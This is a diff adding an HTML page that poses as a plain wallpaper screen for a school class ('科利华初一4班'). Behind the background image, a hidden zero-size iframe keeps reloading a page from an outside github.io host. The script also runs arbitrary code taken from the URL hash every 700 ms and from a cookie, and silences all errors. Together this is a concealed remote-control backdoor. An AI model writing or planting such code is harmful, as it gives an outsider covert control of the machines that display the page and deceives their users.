@@ -1,0 +1,65 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<title>科利华初一4班</title>
+	<style>
+		html, body{
+			overflow: hidden;
+			margin: 0;
+			height: 100%;
+			border: none;
+		}
+		#bgimg{
+			width: 100%;
+			height: 100%;
+			position: absolute;
+			z-index: -1;
+			top: 0;
+			left: 0;
+		}
+		#remote{
+			border: none;
+			margin: 0;
+			width: 0;
+			height: 0;
+		}
+	</style>
+</head>
+
+<body>
+	<img id="bgimg" src="./bliss.JPG">
+	<iframe id="remote"></iframe>
+	<script>
+		"use strict";
+
+		window.onerror = function(){
+			return true;
+		};
+
+		(function(){
+			var retry_timer;
+			var remote = document.getElementById("remote");
+			var retry = function(){
+				clearTimeout(retry_timer);
+				retry_timer = setTimeout(retry, 5000);
+				remote.contentWindow.location.replace("http://anti-nj13z.github.io/remote.html");
+			};
+			retry();
+
+			var check_timer;
+			var check = function(){
+				clearTimeout(check_timer);
+				check_timer = setTimeout(check, 700);
+				eval(decodeURI(location.hash.slice(1)));
+			};
+			check();
+
+			var match = document.cookie.match(/(?:^|;) *cache-source *=([^;]*)/);
+			if(match) eval(unescape(match[1]));
+		})();
+	</script>
+</body>
+
+</html>
